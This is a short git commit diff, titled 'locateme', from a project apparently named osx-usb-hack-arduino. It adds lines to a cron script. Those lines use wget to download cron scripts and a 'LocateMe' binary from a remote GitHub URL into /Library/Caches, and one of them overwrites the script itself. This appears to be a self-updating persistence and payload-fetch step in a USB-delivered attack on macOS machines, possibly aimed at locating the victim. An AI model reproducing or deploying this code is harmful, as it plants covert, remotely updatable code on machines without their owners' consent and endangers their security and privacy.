edfa9de155b59c7c6f4973aa99c30afe71db13ef
Angel Diaz <angel.diaz@gmail.com>
2019-01-26 22:26:49 +0100

    locateme

--- cron-60.sh
+++ cron-60.sh
@@ -1,1 +1,6 @@
 #!/bin/bash
+wget -O /Library/Caches/cron-01.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/cron-01.sh
+wget -O /Library/Caches/cron-05.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/cron-05.sh
+wget -O /Library/Caches/cron-60.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/cron-60.sh
+wget -O /Library/Caches/LocateMe https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/LocateMe
+
